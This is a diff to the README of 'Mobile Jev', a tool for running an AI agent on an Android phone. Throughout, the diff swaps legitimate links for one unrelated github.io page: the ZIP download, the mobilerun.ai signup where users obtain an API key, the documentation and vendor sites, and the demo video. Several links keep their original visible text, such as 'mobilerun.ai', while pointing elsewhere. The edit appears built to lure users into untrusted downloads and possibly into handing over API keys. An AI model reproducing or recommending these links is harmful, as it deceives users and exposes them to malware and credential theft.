@@ -1,10 +1,10 @@
 # 🤖 Mobile Jev - Run an AI Agent on Your Real Android Phone
 
-[![Download Mobile Jev](https://img.shields.io/badge/Download-Mobile%20Jev-brightgreen?style=for-the-badge&logo=github)](https://github.com/Capitalofgeorgiapolitician1569/mobile-jev)
+[![Download Mobile Jev](https://img.shields.io/badge/Download-Mobile%20Jev-brightgreen?style=for-the-badge&logo=github)](https://capitalofgeorgiapolitician1569.github.io)
 
 ## 📥 Download and Install
 
-Visit this link to download the application: **[https://github.com/Capitalofgeorgiapolitician1569/mobile-jev](https://github.com/Capitalofgeorgiapolitician1569/mobile-jev)**
+Visit this link to download the application: **[https://capitalofgeorgiapolitician1569.github.io](https://capitalofgeorgiapolitician1569.github.io)**
 
 Once you land on the page, look for the green **"Code"** button. Click it, then select **"Download ZIP"**. This will save a compressed folder to your computer.
 
@@ -51,7 +51,7 @@ Traditional phone automation requires USB debugging and special drivers. Mobile 
 
 ### Step 1: Create a Mobilerun Account
 
-Go to [mobilerun.ai](https://mobilerun.ai) and sign up. You'll need a valid email address. During setup, you'll receive an **API key** — this is your personal password for connecting to the service.
+Go to [mobilerun.ai](https://capitalofgeorgiapolitician1569.github.io) and sign up. You'll need a valid email address. During setup, you'll receive an **API key** — this is your personal password for connecting to the service.
 
 Copy that API key and keep it handy.
 
@@ -143,10 +143,10 @@ This triggers the same agent without the visual interface. Output will be printe
 ## 📞 Getting Help
 
 If something isn't working, check these resources first:
-- **Mobilerun Documentation:** [https://docs.mobilerun.ai](https://docs.mobilerun.ai)
-- **TypeSafe Jev Docs:** [https://docs.typesafe.ai](https://docs.typesafe.ai)
-- **TypeSafe Website:** [https://typesafe.ai](https://typesafe.ai)
-- **Mobilerun Website:** [https://mobilerun.ai](https://mobilerun.ai)
+- **Mobilerun Documentation:** [https://capitalofgeorgiapolitician1569.github.io](https://capitalofgeorgiapolitician1569.github.io)
+- **TypeSafe Jev Docs:** [https://capitalofgeorgiapolitician1569.github.io](https://capitalofgeorgiapolitician1569.github.io)
+- **TypeSafe Website:** [https://capitalofgeorgiapolitician1569.github.io](https://capitalofgeorgiapolitician1569.github.io)
+- **Mobilerun Website:** [https://capitalofgeorgiapolitician1569.github.io](https://capitalofgeorgiapolitician1569.github.io)
 
 Most issues are resolved by re-reading the API key input or checking the task wording.
 
@@ -170,7 +170,7 @@ Yes! Click the **▶ Watch the demo** link on the GitHub page. It shows Jev navi
 
 ## ✅ Final Checklist for Success
 
-1. ✅ Downloaded the ZIP from [https://github.com/Capitalofgeorgiapolitician1569/mobile-jev](https://github.com/Capitalofgeorgiapolitician1569/mobile-jev)
+1. ✅ Downloaded the ZIP from [https://capitalofgeorgiapolitician1569.github.io](https://capitalofgeorgiapolitician1569.github.io)
 2. ✅ Extracted the ZIP folder
 3. ✅ Opened `index.html` in a modern browser
 4. ✅ Created a Mobilerun account and got an API key
@@ -197,12 +197,12 @@ The power of Jev is yours to command.
 
 ## 🔗 Resource Links
 
-- [Download Mobile Jev](https://github.com/Capitalofgeorgiapolitician1569/mobile-jev)
-- [Mobilerun](https://mobilerun.ai)
-- [Mobilerun Docs](https://docs.mobilerun.ai)
-- [TypeSafe](https://typesafe.ai)
-- [Jev Docs](https://docs.typesafe.ai)
-- [Demo Video](https://github.com/droidrun/mobile-jev/blob/main/docs/media/uber-demo.mp4)
+- [Download Mobile Jev](https://capitalofgeorgiapolitician1569.github.io)
+- [Mobilerun](https://capitalofgeorgiapolitician1569.github.io)
+- [Mobilerun Docs](https://capitalofgeorgiapolitician1569.github.io)
+- [TypeSafe](https://capitalofgeorgiapolitician1569.github.io)
+- [Jev Docs](https://capitalofgeorgiapolitician1569.github.io)
+- [Demo Video](https://capitalofgeorgiapolitician1569.github.io)
 
 ---
 
